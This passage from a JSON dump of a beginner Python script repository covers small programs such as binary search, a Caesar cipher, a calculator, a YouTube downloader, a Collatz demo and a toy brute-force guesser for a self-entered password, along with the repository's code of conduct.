          "content": "from plyer import notification  # pip install plyer\nimport psutil  # pip install psutil\n\n# psutil.sensors_battery() will return the information related to battery\nbattery = psutil.sensors_battery()\n\n# battery percent will return the current battery prcentage\npercent = battery.percent\ncharging = (\n    battery.power_plugged\n)\n\n# Notification(title, description, duration)--to send\n# notification to desktop\n# help(Notification)\nif charging:\n    if percent == 100:\n        charging_message = \"Unplug your Charger\"\n    else:\n        charging_message = \"Charging\"\nelse:\n    charging_message = \"Not Charging\"\nmessage = str(percent) + \"% Charged\\n\" + charging_message\n\nnotification.notify(\"Battery Information\", message, timeout=10)\n"
        },
        {
          "name": "Binary Coefficients.py",
          "type": "blob",
          "size": 0.4345703125,
          "content": "def pascal_triangle(lineNumber):\n    list1 = list()\n    list1.append([1])\n    i = 1\n    while i <= lineNumber:\n        j = 1\n        l = []\n        l.append(1)\n        while j < i:\n            l.append(list1[i - 1][j] + list1[i - 1][j - 1])\n            j = j + 1\n        l.append(1)\n        list1.append(l)\n        i = i + 1\n    return list1\n\n\ndef binomial_coef(n, k):\n    pascalTriangle = pascal_triangle(n)\n    return pascalTriangle[n][k - 1]\n"
        },
        {
          "name": "Binary_search.py",
          "type": "blob",
          "size": 1.134765625,
          "content": "# It returns location of x in given array arr\n# if present, else returns -1\ndef binary_search(arr, l, r, x):\n    # Base case: if left index is greater than right index, element is not present\n    if l > r:\n        return -1\n\n    # Calculate the mid index\n    mid = (l + r) // 2\n\n    # If element is present at the middle itself\n    if arr[mid] == x:\n        return mid\n\n    # If element is smaller than mid, then it can only be present in left subarray\n    elif arr[mid] > x:\n        return binary_search(arr, l, mid - 1, x)\n\n    # Else the element can only be present in right subarray\n    else:\n        return binary_search(arr, mid + 1, r, x)\n\n\n# Main Function\nif __name__ == \"__main__\":\n    # User input array\n    arr = [int(x) for x in input(\"Enter the array with elements separated by commas: \").split(\",\")]\n\n    # User input element to search for\n    x = int(input(\"Enter the element you want to search for: \"))\n\n    # Function call\n    result = binary_search(arr, 0, len(arr) - 1, x)\n\n    # printing the output\n    if result != -1:\n        print(\"Element is present at index {}\".format(result))\n    else:\n        print(\"Element is not present in array\")\n"
        },
        {
          "name": "Binary_to_Decimal.py",
          "type": "blob",
          "size": 0.404296875,
          "content": "# Program to convert binary to decimal\n\n\ndef binaryToDecimal(binary):\n    \"\"\"\n    >>> binaryToDecimal(111110000)\n    496\n    >>> binaryToDecimal(10100)\n    20\n    >>> binaryToDecimal(101011)\n    43\n    \"\"\"\n    decimal, i, n = 0, 0, 0\n    while binary != 0:\n        dec = binary % 10\n        decimal = decimal + dec * pow(2, i)\n        binary = binary // 10\n        i += 1\n    print(decimal)\n\n\nbinaryToDecimal(100)\n"
        },
        {
          "name": "BlackJack_game",
          "type": "tree",
          "content": null
        },
        {
          "name": "BoardGame-CLI",
          "type": "tree",
          "content": null
        },
        {
          "name": "BrowserHistory",
          "type": "tree",
          "content": null
        },
        {
          "name": "BruteForce.py",
          "type": "blob",
          "size": 2.0478515625,
          "content": "from itertools import product\n\n\ndef findPassword(chars, function, show=50, format_=\"%s\"):\n\n    password = None\n    attempts = 0\n    size = 1\n    stop = False\n\n    while not stop:\n\n        # Obtém todas as combinações possíveis com os dígitos do parâmetro \"chars\".\n        for pw in product(chars, repeat=size):\n\n            password = \"\".join(pw)\n\n            # Imprime a senha que será tentada.\n            if attempts % show == 0:\n                print(format_ % password)\n\n            # Verifica se a senha é a correta.\n            if function(password):\n                stop = True\n                break\n            else:\n                attempts += 1\n        size += 1\n\n    return password, attempts\n\n\ndef getChars():\n    \"\"\"\n    Método para obter uma lista contendo todas as\n    letras do alfabeto e números.\n    \"\"\"\n    chars = []\n\n    # Acrescenta à lista todas as letras maiúsculas\n    for id_ in range(ord(\"A\"), ord(\"Z\") + 1):\n        chars.append(chr(id_))\n\n    # Acrescenta à lista todas as letras minúsculas\n    for id_ in range(ord(\"a\"), ord(\"z\") + 1):\n        chars.append(chr(id_))\n\n    # Acrescenta à lista todos os números\n    for number in range(10):\n        chars.append(str(number))\n\n    return chars\n\n\n# Se este módulo não for importado, o programa será testado.\n# Para realizar o teste, o usuário deverá inserir uma senha para ser encontrada.\n\nif __name__ == \"__main__\":\n\n    import datetime\n    import time\n\n    # Pede ao usuário uma senha\n    pw = input(\"\\n Type a password: \")\n    print(\"\\n\")\n\n    def testFunction(password):\n        global pw\n        if password == pw:\n            return True\n        else:\n            return False\n\n    # Obtém os dígitos que uma senha pode ter\n    chars = getChars()\n\n    t = time.process_time()\n\n    # Obtém a senha encontrada e o múmero de tentativas\n    password, attempts = findPassword(\n        chars, testFunction, show=1000, format_=\" Trying %s\"\n    )\n\n    t = datetime.timedelta(seconds=int(time.process_time() - t))\n    input(f\"\\n\\n Password found: {password}\\n Attempts: {attempts}\\n Time: {t}\\n\")\n"
        },
        {
          "name": "CODE_OF_CONDUCT.md",
          "type": "blob",
          "size": 3.26953125,
          "content": "# Contributor Covenant Code of Conduct Easy to understand\n\n## Our Pledge\n\nIn the interest of fostering an open and welcoming environment, we as\ncontributors and maintainers pledge to make participation in our project and\nour community a harassment-free experience for everyone, regardless of age, body\nsize, disability, ethnicity, sex characteristics, gender identity and expression,\nlevel of experience, education, socio-economic status, nationality, personal\nappearance, race, religion, or sexual identity and orientation.\n\n## Our Standards\n\nExamples of behavior that contributes to creating a positive environment\ninclude:\n\n* Using welcoming and inclusive language\n* Being respectful of differing viewpoints and experiences\n* Gracefully accepting constructive criticism\n* Focusing on what is best for the community\n* Showing empathy towards other community members\n\nExamples of unacceptable behavior by participants include:\n\n* The use of sexualized language or imagery and unwelcome sexual attention or\n advances\n* Trolling, insulting/derogatory comments, and personal or political attacks\n* Public or private harassment\n* Publishing others' private information, such as a physical or electronic\n address, without explicit permission\n* Other conduct which could reasonably be considered inappropriate in a\n professional setting\n\n## Our Responsibilities\n\nProject maintainers are responsible for clarifying the standards of acceptable\nbehavior and are expected to take appropriate and fair corrective action in\nresponse to any instances of unacceptable behavior.\n\nProject maintainers have the right and responsibility to remove, edit or\nreject comments, commits, code, wiki edits, issues, and other contributions\nthat are not aligned to this Code of Conduct, or to ban temporarily or\npermanently any contributor for other behaviors that they deem inappropriate,\nthreatening, offensive, or harmful.\n\n## Scope\n\nThis Code of Conduct applies both within project spaces and in public spaces\nwhen an individual is representing the project or its community. Examples of\nrepresenting a project or community include using an official project e-mail\naddress, posting via an official social media account, or acting as an appointed\nrepresentative at an online or offline event. Representation of a project may be\nfurther defined and clarified by project maintainers.\n\n## Enforcement\n\nInstances of abusive, harassing, or otherwise unacceptable behavior may be\nreported by contacting the project team at . All\ncomplaints will be reviewed and investigated and will result in a response that\nis deemed necessary and appropriate to the circumstances. The project team is\nobligated to maintain confidentiality with regard to the reporter of an incident.\nFurther details of specific enforcement policies may be posted separately.\n\nProject maintainers who do not follow or enforce the Code of Conduct in good\nfaith may face temporary or permanent repercussions as determined by other\nmembers of the project's leadership.\n\n## Attribution\n\nThis Code of Conduct is adapted from the [Contributor Covenant][homepage], version 1.4,\navailable at https://www.contributor-covenant.org/version/1/4/code-of-conduct.html\n\n[homepage]: https://www.contributor-covenant.org\n\nFor answers to common questions about this code of conduct, see\nhttps://www.contributor-covenant.org/faq\n"
        },
        {
          "name": "CONTRIBUTING.md",
          "type": "blob",
          "size": 4.1337890625,
          "content": "# Contributing Notepad Sorting\n\nWhen contributing to this repository, please first discuss the change you wish to make via issue,\nemail, or any other method with the owners of this repository before making a change. \n\nPlease note we have a code of conduct, please follow it in all your interactions with the project.\n\n## Pull Request Process\n\n1. Ensure any install or build dependencies are removed before the end of the layer when doing a \n   build.\n2. Update the README.md with details of changes to the interface, this includes new environment \n   variables, exposed ports, useful file locations and container parameters.\n3. Increase the version numbers in any examples files and the README.md to the new version that this\n   Pull Request would represent. The versioning scheme we use is [SemVer](http://semver.org/).\n4. You may merge the Pull Request in once you have the sign-off of two other developers, or if you \n   do not have permission to do that, you may request the second reviewer to merge it for you.\n\n## Code of Conduct\n\n### Our Pledge\n\nIn the interest of fostering an open and welcoming environment, we as\ncontributors and maintainers pledge to making participation in our project and\nour community a harassment-free experience for everyone, regardless of age, body\nsize, disability, ethnicity, gender identity and expression, level of experience,\nnationality, personal appearance, race, religion, or sexual identity and\norientation.\n\n### Our Standards\n\nExamples of behavior that contributes to creating a positive environment\ninclude:\n\n* Using welcoming and inclusive language\n* Being respectful of differing viewpoints and experiences\n* Gracefully accepting constructive criticism\n* Focusing on what is best for the community\n* Showing empathy towards other community members\n\nExamples of unacceptable behavior by participants include:\n\n* The use of sexualized language or imagery and unwelcome sexual attention or\nadvances\n* Trolling, insulting/derogatory comments, and personal or political attacks\n* Public or private harassment\n* Publishing others' private information, such as a physical or electronic\n  address, without explicit permission\n* Other conduct which could reasonably be considered inappropriate in a\n  professional setting\n\n### Our Responsibilities\n\nProject maintainers are responsible for clarifying the standards of acceptable\nbehavior and are expected to take appropriate and fair corrective action in\nresponse to any instances of unacceptable behavior.\n\nProject maintainers have the right and responsibility to remove, edit, or\nreject comments, commits, code, wiki edits, issues, and other contributions\nthat are not aligned to this Code of Conduct, or to ban temporarily or\npermanently any contributor for other behaviors that they deem inappropriate,\nthreatening, offensive, or harmful.\n\n### Scope\n\nThis Code of Conduct applies both within project spaces and in public spaces\nwhen an individual is representing the project or its community. Examples of\nrepresenting a project or community include using an official project e-mail\naddress, posting via an official social media account, or acting as an appointed\nrepresentative at an online or offline event. Representation of a project may be\nfurther defined and clarified by project maintainers.\n\n### Enforcement\n\nInstances of abusive, harassing, or otherwise unacceptable behavior may be\nreported by contacting the project team at [INSERT EMAIL ADDRESS]. All\ncomplaints will be reviewed and investigated and will result in a response that\nis deemed necessary and appropriate to the circumstances. The project team is\nobligated to maintain confidentiality with regard to the reporter of an incident.\nFurther details of specific enforcement policies may be posted separately.\n\nProject maintainers who do not follow or enforce the Code of Conduct in good\nfaith may face temporary or permanent repercussions as determined by other\nmembers of the project's leadership.\n\n### Attribution\n\nThis Code of Conduct is adapted from the [Contributor Covenant][homepage], version 1.4,\navailable at [http://contributor-covenant.org/version/1/4][version]\n\n[homepage]: http://contributor-covenant.org\n[version]: http://contributor-covenant.org/version/1/4/\n"
        },
        {
          "name": "CRC",
          "type": "tree",
          "content": null
        },
        {
          "name": "Caesar Cipher Encoder  & Decoder.py",
          "type": "blob",
          "size": 1.2880859375,
          "content": "# PROJECT1\n# CAESAR CIPHER ENCODER/DECODER\n\n# Author: InTruder\n# Cloned from: https://github.com/InTruder-Sec/caesar-cipher\n\n# Improved by: OfficialAhmed (https://github.com/OfficialAhmed)\n\ndef get_int() -> int:\n    \"\"\"\n    Get integer, otherwise redo\n    \"\"\"\n\n    try:\n        key = int(input(\"Enter number of characters you want to shift: \"))\n    except:\n        print(\"Enter an integer\")\n        key = get_int()\n\n    return key\n\ndef main():\n\n    print(\"[>] CAESAR CIPHER DECODER!!! \\n\")\n    print(\"[1] Encrypt\\n[2] Decrypt\")\n\n    match input(\"Choose one of the above(example for encode enter 1): \"):\n\n        case \"1\":\n            encode()\n\n        case \"2\":\n            decode()\n\n        case _:\n            print(\"\\n[>] Invalid input. Choose 1 or 2\")\n            main()\n\n\ndef encode():\n\n    encoded_cipher = \"\"\n    text = input(\"Enter text to encode: \")\n    key = get_int()\n        \n    for char in text:\n        \n        ascii = ord(char) + key\n        encoded_cipher += chr(ascii)\n\n    print(f\"Encoded text: {encoded_cipher}\")\n\n\ndef decode():\n\n    decoded_cipher = \"\"\n    cipher = input(\"\\n[>] Enter your cipher text: \")\n    key = get_int()\n\n    for character in cipher:\n        ascii = ord(character) - key\n        decoded_cipher += chr(ascii)\n\n    print(decoded_cipher)\n\n\nif __name__ == '__main__':\n    main()\n"
        },
        {
          "name": "Calculate resistance.py",
          "type": "blob",
          "size": 0.4248046875,
          "content": "def res(R1, R2): \n       sum = R1 + R2 \n       if option ==\"series\": \n           return sum \n       elif option ==\"parallel\" : \n           return (R1 * R2)/sum\n       return 0\nResistance1 = int(input(\"Enter R1 : \")) \nResistance2 = int(input(\"Enter R2 : \")) \noption = input(\"Enter series or parallel :\") \nprint(\"\\n\") \nR = res(Resistance1,Resistance2 ) \nif R==0:\n    print('Wrong Input!!' )\nelse:\n    print(\"The total resistance is\", R)\n"
        },
        {
          "name": "Calculator with simple ui.py",
          "type": "blob",
          "size": 1.904296875,
          "content": "# Program make a simple calculator\n\n\nclass Calculator:\n    def __init__(self):\n        pass\n\n    def add(self, num1, num2):\n        \"\"\"\n        This function adds two numbers.\n\n        Examples:\n        >>> add(2, 3)\n        5\n        >>> add(5, 9)\n        14\n        >>> add(-1, 2)\n        1\n        \"\"\"\n        return num1 + num2\n\n    def subtract(self, num1, num2):\n        \"\"\"\n        This function subtracts two numbers.\n\n        Examples:\n        >>> subtract(5, 3)\n        2\n        >>> subtract(9, 5)\n        4\n        >>> subtract(4, 9)\n        -5\n        \"\"\"\n        return num1 - num2\n\n    def multiply(self, num1, num2):\n        \"\"\"\n        This function multiplies two numbers.\n\n        Examples:\n        >>> multiply(4, 2)\n        8\n        >>> multiply(3, 3)\n        9\n        >>> multiply(9, 9)\n        81\n        \"\"\"\n        return num1 * num2\n\n    def divide(self, num1, num2):\n        \"\"\"\n        This function divides two numbers.\n\n        Examples:\n        >>> divide(4, 4)\n        1\n        >>> divide(6, 3)\n        2\n        >>> divide(9, 1)\n        9\n        \"\"\"\n        if num2 == 0:\n            print(\"Cannot divide by zero\")\n        else:\n            return num1 / num2\n\n\ncalculator = Calculator()\n\n\nprint(\"1.Add\")\nprint(\"2.Subtract\")\nprint(\"3.Multiply\")\nprint(\"4.Divide\")\n\nwhile True:\n    # Take input from the user\n    choice = input(\"Enter choice(1/2/3/4): \")\n\n    # Check if choice is one of the four options\n    if choice in (\"1\", \"2\", \"3\", \"4\"):\n        num1 = float(input(\"Enter first number: \"))\n        num2 = float(input(\"Enter second number: \"))\n\n        if choice == \"1\":\n            print(calculator.add(num1, num2))\n\n        elif choice == \"2\":\n            print(calculator.subtract(num1, num2))\n\n        elif choice == \"3\":\n            print(calculator.multiply(num1, num2))\n\n        elif choice == \"4\":\n            print(calculator.divide(num1, num2))\n        break\n    else:\n        print(\"Invalid Input\")\n"
        },
        {
          "name": "Calendar (GUI).py",
          "type": "blob",
          "size": 0.8564453125,
          "content": "from tkinter import *\nimport calendar\n\nroot = Tk()\n# root.geometry(\"400x300\")\nroot.title(\"Calendar\")\n\n# Function\n\ndef text():\n    month_int = int(month.get())\n    year_int = int(year.get())\n    cal = calendar.month(year_int, month_int)\n    textfield.delete(0.0, END)\n    textfield.insert(INSERT, cal)\n\n\n# Creating Labels\nlabel1 = Label(root, text=\"Month:\")\nlabel1.grid(row=0, column=0)\n\nlabel2 = Label(root, text=\"Year:\")\nlabel2.grid(row=0, column=1)\n\n# Creating spinbox\nmonth = Spinbox(root, from_=1, to=12, width=8)\nmonth.grid(row=1, column=0, padx=5)\n\nyear = Spinbox(root, from_=2000, to=2100, width=10)\nyear.grid(row=1, column=1, padx=10)\n\n# Creating Button\nbutton = Button(root, text=\"Go\", command=text)\nbutton.grid(row=1, column=2, padx=10)\n\n# Creating Textfield\ntextfield = Text(root, width=25, height=10, fg=\"red\")\ntextfield.grid(row=2, columnspan=2)\n\n\nroot.mainloop()\n"
        },
        {
          "name": "Cat",
          "type": "tree",
          "content": null
        },
        {
          "name": "Checker_game_by_dz",
          "type": "tree",
          "content": null
        },
        {
          "name": "Chrome Dino Automater.py",
          "type": "blob",
          "size": 1.1728515625,
          "content": "import pyautogui  # pip install pyautogui\nfrom PIL import Image, ImageGrab  # pip install pillow\n\n# from numpy import asarray\nimport time\n\n\ndef hit(key):\n    pyautogui.press(key)\n    return\n\n\ndef isCollide(data):\n\n    # for cactus\n    for i in range(329, 425):\n        for j in range(550, 650):\n            if data[i, j] < 100:\n                hit(\"up\")\n                return\n\n    # Draw the rectangle for birds\n    # for i in range(310, 425):\n    #     for j in range(390, 550):\n    #         if data[i, j] < 100:\n    #             hit(\"down\")\n    #             return\n\n    # return\n\n\nif __name__ == \"__main__\":\n    print(\"Hey.. Dino game about to start in 3 seconds\")\n    time.sleep(2)\n    # hit('up')\n\n    while True:\n        image = ImageGrab.grab().convert(\"L\")\n        data = image.load()\n        isCollide(data)\n\n        # print(aarray(image))\n\n        # Draw the rectangle for cactus\n        # for i in range(315, 425):\n        #     for j in range(550, 650):\n        #         data[i, j] = 0\n\n        # # # # # Draw the rectangle for birds\n        # for i in range(310, 425):\n        #     for j in range(390, 550):\n        #         data[i, j] = 171\n\n        # image.show()\n        # break\n"
        },
        {
          "name": "Classification_human_or_horse.py",
          "type": "blob",
          "size": 1.693359375,
          "content": "import pickle\r\n\r\nimport tensorflow as tf\r\n\r\nmodel = tf.keras.models.Sequential(\r\n    [\r\n        tf.keras.layers.Conv2D(\r\n            16, (3, 3), activation=\"relu\", input_shape=(200, 200, 3)\r\n        ),\r\n        tf.keras.layers.MaxPooling2D(2, 2),\r\n        tf.keras.layers.Conv2D(16, (3, 3), activation=\"relu\"),\r\n        tf.keras.layers.MaxPooling2D(2, 2),\r\n        tf.keras.layers.Conv2D(16, (3, 3), activation=\"relu\"),\r\n        tf.keras.layers.MaxPooling2D(2, 2),\r\n        tf.keras.layers.Flatten(),\r\n        tf.keras.layers.Dense(512, activation=\"relu\"),\r\n        tf.keras.layers.Dense(1, activation=\"sigmoid\"),\r\n    ]\r\n)\r\nmodel.summary()\r\nfrom tensorflow.keras.optimizers import RMSprop\r\n\r\nmodel.compile(optimizer=RMSprop(lr=0.001), loss=\"binary_crossentropy\", metrics=[\"acc\"])\r\nfrom tensorflow.keras.preprocessing.image import ImageDataGenerator\r\n\r\ntrain_datagen = ImageDataGenerator(rescale=1 / 255)\r\ntrain_generator = train_datagen.flow_from_directory(\r\n    \"../Classification_human-or-horse\",\r\n    target_size=(200, 200),\r\n    batch_size=222,\r\n    class_mode=\"binary\",\r\n)\r\nmodel.fit_generator(train_generator, steps_per_epoch=6, epochs=1, verbose=1)\r\nfilename = \"myTf1.sav\"\r\npickle.dump(model, open(filename, \"wb\"))\r\n\r\nfrom tkinter import Tk\r\nfrom tkinter.filedialog import askopenfilename\r\nfrom keras.preprocessing import image\r\nimport numpy as np\r\n\r\nTk().withdraw()\r\nfilename = askopenfilename()\r\nprint(filename)\r\nimg = image.load_img(filename, target_size=(200, 200))\r\nx = image.img_to_array(img)\r\nx = np.expand_dims(x, axis=0)\r\nimages = np.vstack([x])\r\nclasses = model.predict(images, batch_size=10)\r\nprint(classes[0])\r\nif classes[0] > 0.5:\r\n    print(filename + \" is a human\")\r\nelse:\r\n    print(filename + \" is a horse\")\r\n"
        },
        {
          "name": "CliYoutubeDownloader.py",
          "type": "blob",
          "size": 2.5361328125,
          "content": "from pytube import *\r\nimport sys\r\n\r\n\r\nclass YouTubeDownloder:\r\n    def __init__(self):\r\n        self.url = str(input(\"Enter the url of video : \"))\r\n        self.youtube = YouTube(\r\n            self.url, on_progress_callback=YouTubeDownloder.onProgress\r\n        )\r\n        self.showTitle()\r\n\r\n    def showTitle(self):\r\n        print(\"title : {0}\\n\".format(self.youtube.title))\r\n        self.showStreams()\r\n\r\n    def showStreams(self):\r\n        self.streamNo = 1\r\n        for stream in self.youtube.streams:\r\n            print(\r\n                \"{0} => resolation:{1}/fps:{2}/type:{3}\".format(\r\n                    self.streamNo, stream.resolution, stream.fps, stream.type\r\n                )\r\n            )\r\n            self.streamNo += 1\r\n        self.chooseStream()\r\n\r\n    def chooseStream(self):\r\n        self.choose = int(input(\"please select one : \"))\r\n        self.validateChooseValue()\r\n\r\n    def validateChooseValue(self):\r\n        if self.choose in range(1, self.streamNo):\r\n            self.getStream()\r\n        else:\r\n            print(\"please enter a currect option on the list.\")\r\n            self.chooseStream()\r\n\r\n    def getStream(self):\r\n        self.stream = self.youtube.streams[self.choose - 1]\r\n        self.getFileSize()\r\n\r\n    def getFileSize(self):\r\n        global file_size\r\n        file_size = self.stream.filesize / 1000000\r\n        self.getPermisionToContinue()\r\n\r\n    def getPermisionToContinue(self):\r\n        print(\r\n            \"\\n title : {0} \\n author : {1} \\n size : {2:.2f}MB \\n resolution : {3} \\n fps : {4} \\n \".format(\r\n                self.youtube.title,\r\n                self.youtube.author,\r\n                file_size,\r\n                self.stream.resolution,\r\n                self.stream.fps,\r\n            )\r\n        )\r\n        if input(\"do you want it ?(defualt = (y)es) or (n)o \") == \"n\":\r\n            self.showStreams()\r\n        else:\r\n            self.main()\r\n\r\n    def download(self):\r\n        self.stream.download()\r\n\r\n    @staticmethod\r\n    def onProgress(stream=None, chunk=None, remaining=None):\r\n        file_downloaded = file_size - (remaining / 1000000)\r\n        print(\r\n            f\"downloading ... {file_downloaded/file_size*100:0.2f} % [{file_downloaded:.1f}MB of {file_size:.1f}MB]\",\r\n            end=\"\\r\",\r\n        )\r\n\r\n    def main(self):\r\n        try:\r\n            self.download()\r\n        except KeyboardInterrupt:\r\n            print(\"Canceled. \")\r\n            sys.exit(0)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    try:\r\n        YouTubeDownloder()\r\n    except KeyboardInterrupt:\r\n        pass\r\n    except Exception as e:\r\n        print(e)\r\n"
        },
        {
          "name": "CliYoutubeDownloader",
          "type": "tree",
          "content": null
        },
        {
          "name": "Collatz-Conjecture.py",
          "type": "blob",
          "size": 2.455078125,
          "content": "#!/usr/bin/env python3\n\n# Recommended: Python 3.6+\n\n\"\"\"\nCollatz Conjecture - Python\n\nThe Collatz conjecture, also known as the\n3x + 1 problem, is a mathematical conjecture\nconcerning a certain sequence. This sequence\noperates on any input number in such a way\nthat the output will always reach 1.\n\nThe Collatz conjecture is most famous for\nharboring one of the unsolved problems in\nmathematics: does the Collatz sequence really\nreach 1 for all positive integers?\n\nThis program takes any input integer\nand performs a Collatz sequence on them.\nThe expected behavior is that any number\ninputted will always reach a 4-2-1 loop.\n\nDo note that Python is limited in terms of\nnumber size, so any enormous numbers may be\ninterpreted as infinity, and therefore\nincalculable, by Python. This limitation\nwas only observed in CPython, so other\nimplementations may or may not differ.\n\n1/2/2022 - Revision 1 of Collatz-Conjecture\nDavid Costell (DontEatThemCookies on GitHub)\n\"\"\"\n\nimport math\n\nprint(\"Collatz Conjecture (Revised)\\n\")\n\n\ndef main():\n    # Get the input\n    number = input(\"Enter a number to calculate: \")\n    try:\n        number = float(number)\n    except ValueError:\n        print(\"Error: Could not convert to integer.\")\n        print(\"Only numbers (e.g. 42) can be entered as input.\")\n        main()\n\n    # Prevent any invalid inputs\n    if number <= 0:\n        print(\"Error: Numbers zero and below are not calculable.\")\n        main()\n    if number == math.inf:\n        print(\"Error: Infinity is not calculable.\")\n        main()\n\n    # Confirmation before beginning\n    print(\"Number is:\", number)\n    input(\"Press ENTER to begin.\")\n    print(\"\\nBEGIN COLLATZ SEQUENCE\")\n\n    def sequence(number: float) -> float:\n        \"\"\"\n        The core part of this program,\n        it performs the operations of\n        the Collatz sequence to the given\n        number (parameter number).\n        \"\"\"\n        modulo = number % 2  # The number modulo'd by 2\n        if modulo == 0:  # If the result is 0,\n            number = number / 2  # divide it by 2\n        else:  # Otherwise,\n            number = 3 * number + 1  # multiply by 3 and add 1 (3x + 1)\n        return number\n\n    # Execute the sequence\n    while True:\n        number = sequence(number)\n        print(round(number))\n        if number == 1.0:\n            break\n\n    print(\"END COLLATZ SEQUENCE\")\n    print(\"Sequence has reached a 4-2-1 loop.\")\n    exit(input(\"\\nPress ENTER to exit.\"))\n\n\n# Entry point of the program\nif __name__ == \"__main__\":\n    main()\n"
        },
        {
          "name": "Colors",
          "type": "tree",
          "content": null
        },
        {
          "name": "Compression_Analysis",
          "type": "tree",
          "content": null
        },
        {
          "name": "Conversation.py",
          "type": "blob",
          "size": 1.169921875,
          "content": "# imports modules\nimport sys\nimport time\nfrom getpass import getuser\n\n# user puts in their name\nname = getuser()\nname_check = input(\"Is your name \" + name + \"? → \")\nif name_check.lower().startswith(\"y\"):\n    print(\"Okay.\")\n    time.sleep(1)\n\nif name_check.lower().startswith(\"n\"):\n    name = input(\"Then what is it? → \")\n\n# Python lists their name\nuserList = name\n\n# Python & user dialoge\nprint(\"Hello\", name + \", my name is Python.\")\ntime.sleep(0.8)\nprint(\"The first letter of your name is\", userList[0] + \".\")\ntime.sleep(0.8)\nprint(\"Nice to meet you. :)\")\ntime.sleep(0.8)\nresponse = input(\"Would you say it's nice to meet me? → \")\n\n# other dialoge\nif response.lower().startswith(\"y\"):\n    print(\"Nice :)\")\n    sys.exit()\n\nelif response.lower().startswith(\"n\"):\n    response2 = input(\"Is it because I am a robot? → \")\n\nelse:\n    print(\"You may have made an input error. Please restart and try again.\")\n    sys.exit()\nif response2.lower().startswith(\"y\"):\n    print(\"Aw :(\")\n\nelif response2.lower().startswith(\"n\"):\n    response3 = input(\"Then why? → \")\n    time.sleep(1)\n    print(\"Oh.\")\n\nelse:\n    print(\"You may have made an input error. Please restart and try again.\")\n    sys.exit()\n"
        },
        {
          "name": "CountMillionCharacter.py",
          "type": "blob",
          "size": 11.134765625,
          "content": "\"\"\"\nSimple million word count program.\nmain idea is Python pairs words\nwith the number of times\nthat number appears in the triple quoted string.\nCredit to William J. Turkel and Adam Crymble for the word\nfrequency code used below. I just merged the two ideas.\n\"\"\"\nimport re\n\npattern = re.compile(\"\\W\")  # re is used to compile the expression more than once\n# wordstring consisting of a million characters\nwordstring = \"\"\"SCENE I. Yorkshire. Gaultree Forest.\nEnter the ARCHBISHOP OF YORK, MOWBRAY, LORD HASTINGS, and others\nARCHBISHOP OF YORK\nWhat is this forest call'd?\nHASTINGS\n'Tis Gaultree Forest, an't shall please your grace.\nARCHBISHOP OF YORK\nHere stand, my lords; and send discoverers forth\nTo know the numbers of our enemies.\nHASTINGS\nWe have sent forth already.\nARCHBISHOP OF YORK\n'Tis well done.\nMy friends and brethren in these great affairs,\nI must acquaint you that I have received\nNew-dated letters from Northumberland;\nTheir cold intent, tenor and substance, thus:\nHere doth he wish his person, with such powers\nAs might hold sortance with his quality,\nThe which he could not levy; whereupon\nHe is retired, to ripe his growing fortunes,\nTo Scotland: and concludes in hearty prayers\nThat your attempts may overlive the hazard\nAnd fearful melting of their opposite.\nMOWBRAY\nThus do the hopes we have in him touch ground\nAnd dash themselves to pieces.\nEnter a Messenger\nHASTINGS\nNow, what news?\nMessenger\nWest of this forest, scarcely off a mile,\nIn goodly form comes on the enemy;\nAnd, by the ground they hide, I judge their number\nUpon or near the rate of thirty thousand.\nMOWBRAY\nThe just proportion that we gave them out\nLet us sway on and face them in the field.\nARCHBISHOP OF YORK\nWhat well-appointed leader fronts us here?\nEnter WESTMORELAND\nMOWBRAY\nI think it is my Lord of Westmoreland.\nWESTMORELAND\nHealth and fair greeting from our general,\nThe prince, Lord John and Duke of Lancaster.\nARCHBISHOP OF YORK\nSay on, my Lord of Westmoreland, in peace:\nWhat doth concern your coming?\nWESTMORELAND\nThen, my lord,\nUnto your grace do I in chief address\nThe substance of my speech. If that rebellion\nCame like itself, in base and abject routs,\nLed on by bloody youth, guarded with rags,\nAnd countenanced by boys and beggary,\nI say, if damn'd commotion so appear'd,\nIn his true, native and most proper shape,\nYou, reverend father, and these noble lords\nHad not been here, to dress the ugly form\nOf base and bloody insurrection\nWith your fair honours. You, lord archbishop,\nWhose see is by a civil peace maintained,\nWhose beard the silver hand of peace hath touch'd,\nWhose learning and good letters peace hath tutor'd,\nWhose white investments figure innocence,\nThe dove and very blessed spirit of peace,\nWherefore do you so ill translate ourself\nOut of the speech of peace that bears such grace,\nInto the harsh and boisterous tongue of war;\nTurning your books to graves, your ink to blood,\nYour pens to lances and your tongue divine\nTo a trumpet and a point of war?\nARCHBISHOP OF YORK\nWherefore do I this? so the question stands.\nBriefly to this end: we are all diseased,\nAnd with our surfeiting and wanton hours\nHave brought ourselves into a burning fever,\nAnd we must bleed for it; of which disease\nOur late king, Richard, being infected, died.\nBut, my most noble Lord of Westmoreland,\nI take not on me here as a physician,\nNor do I as an enemy to peace\nTroop in the throngs of military men;\nBut rather show awhile like fearful war,\nTo diet rank minds sick of happiness\nAnd purge the obstructions which begin to stop\nOur very veins of life. Hear me more plainly.\nI have in equal balance justly weigh'd\nWhat wrongs our arms may do, what wrongs we suffer,\nAnd find our griefs heavier than our offences.\nWe see which way the stream of time doth run,\nAnd are enforced from our most quiet there\nBy the rough torrent of occasion;\nAnd have the summary of all our griefs,\nWhen time shall serve, to show in articles;\nWhich long ere this we offer'd to the king,\nAnd might by no suit gain our audience:\nWhen we are wrong'd and would unfold our griefs,\nWe are denied access unto his person\nEven by those men that most have done us wrong.\nThe dangers of the days but newly gone,\nWhose memory is written on the earth\nWith yet appearing blood, and the examples\nOf every minute's instance, present now,\nHath put us in these ill-beseeming arms,\nNot to break peace or any branch of it,\nBut to establish here a peace indeed,\nConcurring both in name and quality.\nWESTMORELAND\nWhen ever yet was your appeal denied?\nWherein have you been galled by the king?\nWhat peer hath been suborn'd to grate on you,\nThat you should seal this lawless bloody book\nOf forged rebellion with a seal divine\nAnd consecrate commotion's bitter edge?\nARCHBISHOP OF YORK\nMy brother general, the commonwealth,\nTo brother born an household cruelty,\nI make my quarrel in particular.\nWESTMORELAND\nThere is no need of any such redress;\nOr if there were, it not belongs to you.\nMOWBRAY\nWhy not to him in part, and to us all\nThat feel the bruises of the days before,\nAnd suffer the condition of these times\nTo lay a heavy and unequal hand\nUpon our honours?\nWESTMORELAND\nO, my good Lord Mowbray,\nConstrue the times to their necessities,\nAnd you shall say indeed, it is the time,\nAnd not the king, that doth you injuries.\nYet for your part, it not appears to me\nEither from the king or in the present time\nThat you should have an inch of any ground\nTo build a grief on: were you not restored\nTo all the Duke of Norfolk's signories,\nYour noble and right well remember'd 